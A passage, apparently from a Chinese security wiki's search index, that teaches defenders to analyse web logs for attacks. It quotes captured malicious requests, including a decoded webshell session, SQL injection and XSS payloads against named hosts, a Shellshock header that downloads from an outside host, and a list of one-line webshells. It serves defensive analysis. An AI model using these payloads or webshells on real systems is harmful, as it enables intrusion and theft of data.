4)\u540e\u6e17\u900f\u653b\u51fb\u6a21\u5757\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u5b9e\u65bd\u8df3\u677f\u653b\u51fb\u7b49","title":"\u53cd\u5f39shell"},{"location":"%E5%AE%89%E5%85%A8wiki/%E7%9B%AE%E5%BD%95/","text":"\u6458\u81ea\u5b89\u5168\u9762\u8bd5pdf","title":"\u76ee\u5f55"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","text":"\u4e00.Web\u5e94\u7528\u57fa\u7840\u77e5\u8bc6\u4e0e\u5de5\u5177 \u00b6 1\u3001\u7f16\u7801 \u7f16\u7801\u65b9\u5f0f: URL\u7f16\u7801\u3001 BASE64\u7f16\u7801\u3001 16\u8fdb\u5236\u7f16\u7801\u3001UTF-8\u7f16\u7801 \u5b57\u7b26\u96c6: Unicode\uff0cGB2312\uff0c GBK\u7b49 16\u8fdb\u5236\u7801 \u4ee5x\u5f00\u5934 GET /news/society/201210/2358322923.shtml\" \u7ea2\u8272\u90e8\u520616\u8fdb\u5236\u89e3\u7801\u540e\u5982\u4e0b GET /news/society/201210/2358322923.shtml\" ; \u5728\u7ebf\u8f6c\u6362https:// www.bejson.com/convert/ ox2str/ UNICODE\u7f16\u7801: \u4ee5u\u3001\\u+\u3001 &#x\u3001&#\u5f00\u5934 \u6bd4\u5982 \\u0031\\u0038\\u0037\\u0030\\u0038\\u0036\\u0030\\u0039\\u0039\\u0030\\u0039 \u89e3\u7801\u540e\u662f\u4e2a\u624b\u673a\u53f718708609909 \u5728\u7ebf\u8f6c\u6362https:// www.online-toolz.com/tools/text-unicode-entities-convertor.php Base64\u7f16\u7801 base64\u662f\u7f51\u7edc\u4e0a\u6700\u5e38\u89c1\u7684\u7528\u4e8e\u4f20\u8f938Bit\u5b57\u8282\u4ee3\u7801\u7684\u7f16\u7801\u65b9\u5f0f\u4e4b\u4e00\uff0c \u8981\u6c42\u628a\u6bcfE \u4e2a8Bit\u7684\u5b57\u8282\u8f6c\u6362\u4e3a\u56db\u4e2a6Bit\u7684\u5b57\u8282\uff0c\u5728email\u4f20\u8f93\u4e2d\uff0c \u52a0\u5bc6\u662f\u80af\u5b9a\u7684\uff0c\u4f46\u662f\u52a0\u5bc6\u7684 \u76ee\u7684\u4e0d\u662f\u8ba9\u7528\u6237\u53d1\u9001\u975e\u5e38\u5b89\u5168\u7684Email\u3002\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u4e3b\u8981\u5c31\u662f\u201c\u9632\u541b\u5b50\u4e0d\u9632\u5c0f\u4eba\u201d\u3002 \u4e2a\u4eba\u8ba4\u4e3a\u8fd9\u4e2a\u4e0d\u80fd\u7b97\u52a0\u5bc6\uff0c\u56e0\u4e3a\u8fd9\u79cd\u7f16\u7801\u8fc7\u7a0b\u662f\u53ef\u9006\u7684 2\u3001\u89e3\u7801\u5de5\u5177 3\u3001\u6570\u636e\u63d0\u4ea4\u65b9\u5f0f \u6211\u4eec\u4e00\u822c\u662f\u901a\u8fc7GET\u3001POST \u3001COOKIE (\u4fd7\u79f0GPC)\u4e09\u90e8\u5206\u63d0\u4ea4\u53c2\u6570\u8bf7\u6c42\u7ed9\u670d\u52a1\u5668\u7684 GPC\u901a\u5e38\u88ab\u5229\u7528\u63d0\u4ea4\u6076\u610f\u53c2\u6570\u6267\u884cweb\u5e94\u7528\u5c42\u653b\u51fb,\u5176\u5b83HTTP\u5934\u90e8\u4e5f\u53ef\u88ab\u653b\u51fb\u8005\u5229\u7528 Type\u548cid\u5c31\u662f\u6211\u4eec\u63d0\u4ea4\u7684\u8bf7\u6c42\uff0c& \u4f8b: \u4e3a\u53c2\u6570\u5206\u9694\u7b26 POST /addnews.asp HTTP/1.1 t GET /news.asp?type=5&id=123 HTTP/1.1 Accept: / Referer: http://www .test.com/index.asp Accept- Language: zh-CN User-Agent: Moilla/4.0 (compatible; MSIE 8.0 Cookie\u91cc\u4e5f\u80fd\u63d0\u4ea4\u53c2\u6570\u8bf7\u6c42\uff0c \u5206\u53f7;\u4e3a\u53c2\u6570\u5206\u9694\u7b26 Accept- Encoding: gzip, deflate Host: www.test . com Connection: Keep- Alive POST body\u63d0\u4ea4\u53c2\u6570\u8bf7\u6c42\uff0c&\u4e3a\u53c2\u6570\u5206\u9694\u7b26 Cookie: ASPSESSIONID=MIIDIPGCCJGAFJ Title=test&content=test 4\u3001\u5e38\u89c1\u811a\u672c\u8bed\u8a00 5\u3001\u65e5\u5fd7\u8fd8\u539f \u8fd8\u539f\u65e5\u5fd7\u7684\u524d\u63d0\u662f\u83b7\u53d6\u5230\u653b\u51fb\u8005\u53d1\u9001\u7684\u6570\u636e\u5305\u5185\u5bb9 \u5982\u4f55\u83b7\u53d6\u653b\u51fb\u8005\u53d1\u9001\u7684\u6570\u636e? 1\u3001\u9632\u706b\u5899: \u9632\u706b\u5899\u5185\u7f6e\u6570\u636e\u4e2d\u5fc3\u4f1a\u8bb0\u5f55\u6570\u636e\u5305\u5185\u5bb9 2\u3001\u6001\u52bf\u611f\u77e5: . \u6001\u52bf\u611f\u77e5\u5916\u90e8\u5a01\u80c1\u611f\u77e5\u65e5\u5fd7\u91cc\u9762\u8bb0\u5f55\u7684\u6570\u636e\u5305\u5185\u5bb9 \u4e24\u8005\u90fd\u53ef\u4ee5\u5bfc\u51fa\u6570\u636e\u4e2d\u5fc3\u91cc\u9762\u7684\u65e5\u5fd7\uff0c\u5982\u679c\u53ef\u4ee5\u91cd\u73b0\uff0c\u53ef\u4ee5\u9632\u706b\u5899\u4e0a\u9762\u76f4\u63a5 \u6293\u53d6\u6570\u636e\u5305 URL+BASE64\u7f16\u7801\u8fd8\u539f \u4f8b\uff1a\u5f00\u5934\u8bb2\u5230\u8ba9\u5ba2\u6237\u6293\u72c2\u7684webshell\u65e5\u5fd7 POST /upfiles/bak.php ghost= %40**eval %01%28**base64_decode**%28%24**_POST**%5B**z0**%5D%29%29%3B**&z0=Q GluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X 21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0**%2B**fCIpOzskRj1iYXNlNjRfZGVjb2RlK CRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpe mUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw**%3D%3D**&z1=RDpc XEFQTVNlcnY1LjIuNlxcd3d3XFxwaHBNeUFkbWluXFxjb25maWcuc2FtcGxlLmluYy5waH A**%3D** url\u89e3\u7801\u4e00\u6b21 ghost=@eval(base64_decode($_POST[z0])); &z0 =QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jz IiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDA pO2VjaG8oIi0+fCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCR GLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2Vja G8oInw8LSIpO2RpZSgpOw== &z1 =RDpcXEFQTVNlcnY1LjIuNlxcd3d3XFxwaHBNeUFkbW luXFxjb25maWcuc2FtcGxlLmluYy5waHA= \u5c06z0\u548cz1\u8fdb\u884cBASE64\u89e3\u7801\u5982\u4e0b z0=@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0 );echo(\">|\");; F=base64_decode( F=base64_decode( _POST[\"z1\"]); P=@fopen( P=@fopen( F, \"r\");echo(@fread( P,filesize( P,filesize( F)));@fclose($P);;echo(\"|<-\");die(); z1=D:\\APMServ5.2.6\\www\\phpMyAdmin\\config.sample.inc.php \u53ef\u4ee5\u770b\u51fa\u6765\u662f\u83dc\u5200\u5de5\u5177\u8fde\u63a5PHPwebshell\u8bfb\u53d6config.sample.inc.php\u5185\u5bb9\u7684\u884c\u4e3a\uff0c \u975e\u8bef\u62a5 \u4e8c.\u5982\u4f55\u5206\u6790\u65e5\u5fd7 \u00b6 1\u3001\u5206\u6790\u65e5\u5fd7\u7684\u76ee\u7684 \u00b6 2\u3001\u653b\u51fb\u51fa\u73b0\u7684\u4f4d\u7f6e \u00b6 \u2022 Get\u3001post \u8bf7\u6c42\u62a5\u6587\u7684url\u5b57\u6bb5 \u2022 Get \u3001post\u8bf7\u6c42\u62a5\u6587\u7684cookie\u5b57\u6bb5 \u2022 Get\u3001post\u8bf7\u6c42\u62a5\u6587\u7684referer\u5b57\u6bb5 \u2022 xss\u653b\u51fb \u2022 SQL\u6ce8\u5165 \u2022 \u547d\u4ee4\u6267\u884c \u2022 \u6587\u4ef6\u5305\u542b \u2022 \u76ee\u5f55\u7a7f\u8d8a \u2022 webshell \u2022 \u4fe1\u606f\u6cc4\u9732 \u2022 \u7f51\u7ad9\u626b\u63cf cookie\u5b57\u6bb5\u3001referer\u5b57\u6bb5\u3001post\u8868\u5355\u5b57\u6bb5\u548curl\u8bf7\u6c42\u7c7b\u4f3c \u2022 Post\u8bf7\u6c42\u62a5\u6587\u7684\u8868\u5355\u5b57\u6bb5 \u2022 Get \u3001post\u8bf7\u6c42\u62a5\u6587\u7684user-agent\u5b57\u6bb5 User-agent \u5b57\u6bb5\u6216\u8005\u7c7b\u4f3c\u8868\u793a\u8bbf\u95ee\u5ba2\u6237\u7aef\u8f6f\u4ef6\u7684\u5b57\u6bb5 \u6076\u610f\u722c\u866b\uff1aPython-urllib/2.6\u3001Baidu-YunGuanCe-ScanBot(ce.baidu.com) \u626b\u63cf\u5668\uff1amorfeus fucking scanner\u3001 Accept:acunetix/wvs sql\u6ce8\u5165\u6f0f\u6d1e\uff1asqlmap/1.0.8.15#dev ( http://sqlmap.org ) xss\u653b\u51fb\uff1a'%22()%26%25 prompt(961668) \u5176\u5b83\u975e\u5e38\u7279\u6b8a\u653b\u51fb \uff1aUser-Agent: () { :; }; /bin/mkdir -p /share/HDB_DATA/.../ && /usr/bin/wget -q -c http://lliillii.altervista.org/io.php 0<&1 2>&1 \u2022 Post\u8bf7\u6c42\u62a5\u6587\u7684\u8868\u5355\u5b57\u6bb5 \u2022 Http\u5e94\u7b54\u9875\u9762 http\u62a5\u6587\u8d1f\u8f7d\u90e8\u5206 \u2022 webshell \uff08\u8bf7\u6c42\u548c\u5e94\u7b54\u65b9\u5411\u90fd\u53ef\u80fd\uff09 \u2022 \u4fe1\u606f\u6cc4\u9732\uff08\u5e94\u7b54\u65b9\u5411\uff09 \u603b\u7ed3:\u4ec0\u4e48\u662f\u653b\u51fb \u2022 \u5728http\u62a5\u6587\u5934\u90e8\uff0c\u51fa\u73b0\u4e86\u4e00\u4e9b\u4e0d\u5e94\u8be5\u51fa\u73b0\u7684\u5b57\u6bb5 \u2022 url\u548cpost\u8868\u5355\uff0creferer\u3001cookie\u51fa\u73b0\u4e86sql\u8bed\u53e5\u3001\u7cfb\u7edf\u547d\u4ee4\u3001\u811a\u672c\u4ee3\u7801(js\u4ee3\u7801\u3001php\u4ee3\u7801)\u4e00\u822c\u90fd\u4e0d\u6b63 \u5e38 \u2022 \u8bbf\u95ee\u6216\u8005\u63a2\u6d4b\u4e86\u4e00\u4e9b\u654f\u611f\u6587\u4ef6 \u2022 \u5e94\u7b54\u62a5\u6587\u53ef\u80fd\u6cc4\u9732\u4e00\u4e9b\u7cfb\u654f\u611f\u4fe1\u606f\u7684 3\u3001\u653b\u51fb\u5e38\u89c1\u7684\u8bed\u53e5 \u00b6 \u2022 sql**\u6ce8\u5165** \u2022 \u63a2\u6d4b\u8bed\u53e5 \u2022 http://www.19cn.com/showdetail.asp?id=49 and 1=1 \u2022 http://www.19cn.com/showdetail.asp?id=49 or 1=1 \u2022 and char(124)%2Buser%2Bchar(124)=0 \uff08\u6ce8\u5165\u7c7b\u578b\u5224\u65ad\uff09 \u2022 \u6743\u9650\u5224\u65ad \u2022 and user>0 \u7528\u6237\u540d \u2022 and 1=(select IS_SRVROLEMEMBER('sysadmin')) \u6743\u9650 \u2022 and exists (select * from sysobjects) \u6570\u636e\u5e93\u7c7b\u578b\u5224\u65adsqlserver \u2022 \u67e5\u8be2\u6570\u636e \u2022 and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) \u67e5\u5e93\u540d \u2022 and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 \u67e5\u8868\u540d \u2022 and (select count(\u5b57\u6bb5\u540d) from \u8868\u540d)>0 \u731c\u5b57\u6bb5 \u2022 and (select top 1 len(username) from admin)=X \u731c\u5b57\u6bb5\u503c \u2022 http://localhost/mytest/sqlinject/?id=1+UNION+SELECT+1,password,3,username,5,6,7,8,9+FROM+useunion select\u731c\u89e3\u6cd5\u2022 \u6570\u636e and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116 REQUEST: GET /webDisplay/ESite/English/DetailSubCollege.jsp?id=b27e56ef-d3b8-42e1-bf0b-6ca906ee6dec'and'x'='x HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1) Host: www.sada.sh.edu.cn Accept: */* Cookie: JSESSIONID=77790B475346A1A5DDA5BB269EF64903 REQUEST: GET /plus/search.php?keyword=as&c=d&typeArr[111%3D@`\\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12 ,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from +`%23@__admin`%23@`\\'`+]=a HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) Cookie: JSESSIONID=0000dB5Hac5-0MrKRsyqX6sr-Lr:-1 Host: www.bcu.edu.cn REQUEST: POST /login/login.asp HTTP/1.1 Content-Length: 304 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Host: 211.68.97.16:12000 Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: sqlmap/1.0.4.19#dev (http://sqlmap.org) Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7 Connection: close Pragma: no-cache Cache-Control: no-cache,no-store Content-Type: application/x-www-form-urlencoded; charset=utf-8 user_no=lNiv&user_pass=&u_type=4%' AND (SELECT 2017 FROM(SELECT COUNT(*),CONCAT(0x7178766b71,(SELECT (ELT(2017=2017,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='&Submit= +%B5%C7+%C2%BC+ 2021/3/26 REQUEST: POST /do/s_ rpc.php HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded Host: www.edu.dl.cnContent-Length: 235 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/27.0.1453.93 Safari/537.36queryString=111%df' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECTconcat(0x3a,username,0x3a,password,0x3a) from qb_members limit0,1),FLOOR(RAND(0)*2))X FROM information_ schema.tables GROUP BY X)a) # HTTP/1.1 ication/x-www-form-urlencoded n 5 a/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like .1453.93 Safari/537.36 ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECTme,0x3a,password,0x3a) from qb_members limit *2))X FROM information_schema.tables GROUP BY X)a) #\u5185\u90e8\u8d44\u6599 \u51c6\u8fbe\u5185\u90e8\u8d44 \u2022 xss**\u653b\u51fb** REQUEST: GET /CuteSoft_Client/'\"()&%<ScRiPt >prompt(994848)</ScRiPt>/SpellCheck.aspx HTTP/1.1 Referer: http://emp.bcu.edu.cn/ Cookie: ASP.NET_SessionId=gd1kgz55m5wmrt45oorcal55; ASPSESSIONIDASBQQBCS=MPNDNMCCBNGNECDGKAAIEDMF Host: emp.bcu.edu.cn Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36 Accept: */* REQUEST: GET /error_page.htm?flag='+alert('XSS')+' HTTP/1.1 Host: tuan.midea.com.cn Connection: Keep-Alive Accept: */* User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1\uff09 \u2022 alert(\"xss\") \u811a\u672c \u2022 / \u5c5e\u6027 \u2022 \u2022 \u4e8b\u4ef6 \u2022 \u2022 alert('xss'); \u2022 @import'javascript:alert(\"xss\")'; \u2022 \u2022 \u547d\u4ee4\u6267\u884c \u2022 GET /simple/tests/tmssql.php?do=phpinfo \u2022 GET /detail.php?id=/winnt/system32/cmd.exe?/c+dir+c:%5c \u2022 GET /cgi/maker/ptcmd.cgi?cmd=;cat+/tmp/config/usr.ini \u2022 GET /cgi/maker/ptcmd.cgi?cmd=;cat+/etc/passwd \u2022 \u76ee\u5f55\u7a7f\u8d8a \u2022 webshell \u2022 <%eval request(\"sb\")%> \u2022 <%execute request(\"sb\")%> \u2022 <?php eval( _POST[sb]);?> \u2022 <?php @eval( _POST[sb]);?> \u2022 <?php @eval( POST[sb]);?> \u2022 <? _POST['sa']( _POST['sa']( _POST['sb']);?> \u2022 <?php @preg_replace(\"/[email]/e\", _POST['h'],\"error\"); ?><br>\u2022 <%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(\"123\"))%><br>\u2022 <%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-lr+k-e+k-q+k-u+k-e+k-s+kt(\"c\")%>(UTF-7\u7f16\u7801\u683c\u5f0f\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c)<br> \u2022 <?php @ _POST['h'],\"error\"); ?><br>\u2022 <%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(\"123\"))%><br>\u2022 <%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-lr+k-e+k-q+k-u+k-e+k-s+kt(\"c\")%>(UTF-7\u7f16\u7801\u683c\u5f0f\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c)<br> \u2022 <?php @ =\"s\".\"s\"./ -/ - /\"e\"./ -/ - /\"r\";@ _=/*-/*-*/\"a\"./*-/*-*/ _=/*-/*-*/\"a\"./*-/*-*/ _./ -/ - /\"t\";@ _/*-/*-*/( _/*-/*-*/( / -/ - */{\"_P\"./ -/ - /\"OS\"./ -/ - /\"T\"}[/ -/ - /0/ -/ -*/]);?> \u2022 \u4fe1\u606f\u6cc4\u9732 \u2022 \u914d\u7f6e\u6587\u4ef6\u8bbf\u95ee \u2022 httpd.conf \u2022 htaccess \u2022 HTPASSWD \u2022 boot.ini \u2022 etc/passwd \u2022 Php.ini \u2022 Web.xml \u2022 \u7279\u6b8a\u540e\u7f00 \u2022 .mdb\u3001 .sql \u2022 .bak\u3001.sav\u3001.old\u3001.las \u2022 .tmp\u3001.temp \u2022 .rar\u3001.zip\u3001.bz\u3001gzip\u3001tar \u2022 .conf\u3001inc\u3001ini\u3001bat \u2022 .log\u3001stats\u3001statistics \u2022 Web.xml \u2022 \u76ee\u5f55\u6d4f\u89c8 \u2022 Parent Directory \u2022 Directory Listing For \u2022 Index of / \u2022 Welcome to the directory listing \u2022 \u9519\u8bef\u4fe1\u606f \u2022 \u6570\u636e\u5e93\u9519\u8bef\u4fe1\u606f \u2022 \u7a0b\u5e8f\u9519\u8bef\u4fe1\u606f \u2022 \u7f51\u7ad9\u626b\u63cf \u2022 \u6076\u610f\u722c\u866b \u2022 \u6d4f\u89c8\u5668\u7684user-agent\u5b57\u6bb5\u4e00\u822c\u90fd\u6bd4\u8f83\u56fa\u5b9a\u5982: \u2022 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) \u2014\u2014IE 9.0 \u2022 \u4e0d\u662f\u6d4f\u89c8\u5668\u7684user-agent \uff0c\u5f88\u53ef\u80fd\u5c31\u662f\u722c\u866b \u2022 \u626b\u63cf\u8f6f\u4ef6\uff1a user-agent\u5b57\u6bb5\u6216\u8005\u5355\u72ec\u6807\u793a\u81ea\u5df1\u7684\u8f6f\u4ef6 \u2022 \u7efc\u5408\u626b\u63cf\u5668\uff1a wvs\u3001 appscan \u2022 \u4e13\u7528\u626b\u63cf\u5668\uff1a sql\u6ce8\u5165 2021/3/26 \u51c6\u8fbe\u5185 4\u3001\u653b\u51fb\u5e38\u89c1\u7684\u7279\u70b9 \u00b6 \u653b\u51fb\u7279\u70b9\uff1a \u2022 \u653b\u51fb\u4e00\u822c\u90fd\u6709\u4e00\u5b9a\u7684\u8fde\u7eed\u6027\uff0c\u6240\u4ee5\u4e00\u6bb5\u65f6\u95f4\u4f1a\u4ea7\u751f\u591a\u6761\u65e5\u5fd7\uff0c\u5e76\u4e14\u547d\u4e2d\u7279 \u5f81id\u662f\u6709\u4e00\u5b9a\u5206\u5e03\u7684\uff0c\u4e0d\u80fd\u662f\u53ea\u547d\u4e2d\u67d0\u4e2a\u7279\u5f81\u3002 \u2022 \u653b\u51fb\u4e00\u822c\u90fd\u4f1a\u501f\u52a9\u5de5\u5177\u8fdb\u884c\uff0c\u540c\u4e00\u4e2aIP\u5730\u5740\u65e5\u5fd7\u95f4\u9694\u8f83\u5c0f \uff0c\u53ef\u80fd\u4e00\u79d2\u4e2d\u4ea7 \u751f\u51e0\u6761\u65e5\u5fd7\uff0c\u660e\u663e\u4e0d\u662f\u4eba\u64cd\u4f5c\u6d4f\u89c8\u5668\u7684\u884c\u4e3a\u3002 \u2022 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u501f\u52a9\u4e00\u5b9a\u8df3\u677f\uff0c\u5982\u679cIP\u5730\u5740\u662f\u56fd\u5916\u7684\uff0c\u653b\u51fb\u5acc\u7591\u8f83\u5927 5\u3001\u653b\u51fb\u65e5\u5fd7\u5206\u6790\u6d41\u7a0b \u00b6 \u2022 \u57fa\u4e8e\u653b\u51fbIP\u5730\u5740\u65b9\u6cd5\u5206\u6790\uff08\u9002\u7528\u65e5\u5fd7\u8f83\u591a\u7684\u60c5\u51b5\uff09 \u2022 \u627e\u51fa\u4e00\u4e2a\u660e\u663e\u7684\u653b\u51fb\u884c\u4e3a\u7684\u65e5\u5fd7 \u2022 \u6839\u636e\u8be5\u65e5\u5fd7\u627e\u51fa\u653b\u51fb\u6e90IP\u5730\u5740 \u2022 \u7b5b\u9009\u51fa\u9488\u5bf9\u8be5IP\u5730\u5740\u7684\u65e5\u5fd7\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u57fa\u672c\u90fd\u662f\u653b\u51fb\uff0c\u6ca1\u6709\u8bef\u62a5 \u2022 \u9488\u5bf9\u8be5IP\u5730\u5740\uff0c\u5229\u7528\u524d\u9762\u4ecb\u7ecd\u7684\u77e5\u8bc6\uff0c\u5c31\u53ef\u4ee5\u770b\u51fa\u653b\u51fb\u8005\u90fd\u53d1\u8d77\u4e86\u54ea\u4e9b\u653b \u51fb \u2022 \u57fa\u4e8e\u653b\u51fb\u65b9\u6cd5\u5206\u6790\uff08\u9002\u7528\u6bcf\u7c7b\u4e0d\u592a\u591a\u7684\u653b\u51fb\uff09 \u2022 \u770b\u653b\u51fb\u8bed\u53e5\uff0c\u662f\u5426\u662f\u660e\u663e\u653b\u51fb\u884c\u4e3a \u2022 \u5982\u679c\u80fd\u770b\u51fa\u662f\u660e\u663e\u7684\u884c\u4e3a\uff0c\u5c31\u53ef\u4ee5\u786e\u5b9a\u662f\u653b\u51fb \u2022 \u5982\u679c\u4e0d\u786e\u5b9a\uff0c\u8fd8\u9700\u8981\u7ed3\u5408\u5176\u4ed6\u53c2\u6570\uff0c \u6e90IP\u5730\u5740 \uff1a\u662f\u5426\u51fa\u73b0\u8fc7\u5176\u4ed6\u7c7b\u578b\u53ef\u4ee5\u660e\u786e\u7684\u653b\u51fb\u884c\u4e3a \u653b\u51fb\u65f6\u95f4\uff1a\u5982\u679c\u534a\u591c\u6216\u8005\u51cc\u6668\u6d3b\u52a8\u6bd4\u8f83\u9891\u7e41 \uff0c\u53ef\u4ee5\u6000\u7591\u4e3a\u653b\u51fb\u3002 \u65e5\u5fd7\u9891\u7387 \uff1a\u4e00\u79d2\u4e2d\u51fa\u73b0\u51e0\u6b21\u65e5\u5fd7\uff0c\u53ef\u4ee5\u6000\u7591\u4e3a\u653b\u51fb\u3002 \u653b\u51fb\u4f4d\u7f6e\uff1a\u56fd\u5916\u7684ip\u5730\u5740 \uff0c\u53ef\u4ee5\u6000\u7591\u4e3a\u653b\u51fb \u62a5\u6587\u8bed\u4e49\u5206\u6790\uff1a\u6bd4\u5982\u8bbf\u95eeadmin\u6587\u4ef6\u5939 \uff0c\u53ef\u80fd\u662f\u6709\u653b\u51fb\u884c\u4e3a \u4e0a\u8ff0\u51e0\u4e2a\u53c2\u6570\u53ef\u4ee5\u7ec4\u5408\u5206\u6790\uff0c\u8fdb\u4e00\u6b65\u786e\u5b9a\u653b\u51fb \u95ee\u9898 \uff1a\u4e00\u4e9b\u7f51\u7ad9\u5b9e\u73b0\u5b58\u5728\u5b89\u5168\u9690\u60a3 \uff0c\u7528\u6237\u7684\u4e00\u4e9b\u6b63\u5e38\u6d41\u91cf\uff0c\u4e5f\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u7be1\u6539\uff0c \u76f4\u63a5\u53d1\u8d77\u653b\u51fb\u3002 \u2022 \u5e38\u89c1\u95ee\u9898\uff1a \u2022 url\u53c2\u6570\u5b9e\u73b0\u65f6\u76f4\u63a5\u4f20\u9012sql\u8bed\u53e5 \u2022 url\u53c2\u6570\u5b9e\u73b0\u65f6\u53ef\u4ee5\u4f20\u9012js\u811a\u672c \u2022 url\u53c2\u6570\u5b9e\u73b0\u65f6\u7528../\u8fdb\u884c\u76ee\u5f55\u7a7f\u8d8a\u8bbf\u95ee\u6587\u4ef6 \u2022 url\u53c2\u6570\u5b9e\u73b0\u65f6\u76f4\u63a5\u8c03\u7528\u4e00\u4e9b\u7cfb\u7edf\u51fd\u6570 \u2022 url\u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u57df\u540d\u91cd\u5b9a\u5411 \u2022 \u7cfb\u7edf\u914d\u7f6e\u5b58\u5728\u5b89\u5168\u9690\u60a3 \u2022 \u901a\u8fc7\u53c2\u6570\u76f4\u63a5\u4f20sql\u8bed\u53e5\uff08 sql\u6ce8\u5165\u7c7b\u8bef\u62a5\uff09 \u2022 \u901a\u8fc7\u53c2\u6570\u76f4\u63a5\u4f20js\u811a\u672c \uff08XSS\u4e2d\u8bef\u62a5\u8f83\u591a\uff09 \u2022 \u901a\u8fc7../\u7a7f\u8d8a\u76ee\u5f55\u8bbf\u95ee\u6587\u4ef6 \uff08\u76ee\u5f55\u7a7f\u8d8a\u8bef\u62a5\uff09 \u2022 \u901a\u8fc7url\u53c2\u6570\u8fdb\u884c\u57df\u540d\u8df3\u8f6c\uff08\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u8bef\u62a5\uff09 \u2022 \u5f00\u542f\u4e86\u76ee\u5f55\u8bbf\u95ee\u529f\u80fd\uff08\u4fe1\u606f\u6cc4\u9732\uff09 \u653b\u51fb\u548c\u6b63\u5e38\u5e94\u7528\u533a\u5206\u4e0d\u5f00 \u2022 \u524d\u9762\u8bf4\u7684\u7528\u6237\u7f51\u7ad9\u5b58\u5728\u4e00\u5b9a\u5b89\u5168\u9690\u60a3\u662f\u8fd9\u79cd\u60c5\u51b5\u7684\u4e00\u79cd \u2022 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5 \uff0c\u7528\u6237\u7684\u5e94\u7528\u6bd4\u8f83\u7279\u6b8a\uff0c\u7406\u8bba\u4e0a\u6240\u6709\u89c4\u5219\u90fd\u80fd\u8bef\u62a5 \u2022 \u7528\u6237\u662f\u4e00\u4e2a\u8bba\u575b\u7c7b\u5e94\u7528\uff0c\u53ef\u4ee5\u63d0\u4ea4\u4efb\u610f\u4e1c\u897f\uff0c\u5305\u62ec\u6587\u7ae0\u7c7b \u2022 \u7528\u6237\u662f\u4e00\u4e2a\u4ee3\u7801\u63d0\u4ea4\u8ba8\u8bba\u7f51\u7ad9\uff0c\u7ecf\u5e38\u901a\u8fc7post\u8868\u5355\u63d0\u4ea4\u4ee3\u7801 \u2022 \u8fd9\u7c7b\u5e94\u7528\u4e3b\u8981\u4f53\u73b0\u5728\u5b66\u6821\u5e94\u7528\u4e2d\u8f83\u591a \u2022 \u7528\u6237\u7684\u5e94\u7528\u662f\u4f20\u4e00\u4e2a\u6587\u7ae0\uff0c\u91cc\u9762\u6709\u653b\u51fb\u5e38\u89c1\u7684\u5173\u952e\u5b57 \u2022 \u7528\u6237\u7684\u5e94\u7528\u662f\u4ee3\u7801\u4ea4\u6d41\u7f51\u7ad9\uff0c\u4f20\u4e00\u6bb5\u4ee3\u7801 \u2022 \u719f\u6089\u653b\u51fb\u4ea7\u751f\u4f4d\u7f6e \u2022 \u719f\u6089\u653b\u51fb\u5e38\u89c1\u8bed\u53e5 \u2022 \u638c\u63e1\u653b\u51fb\u5206\u6790\u65b9\u6cd5 \u2022 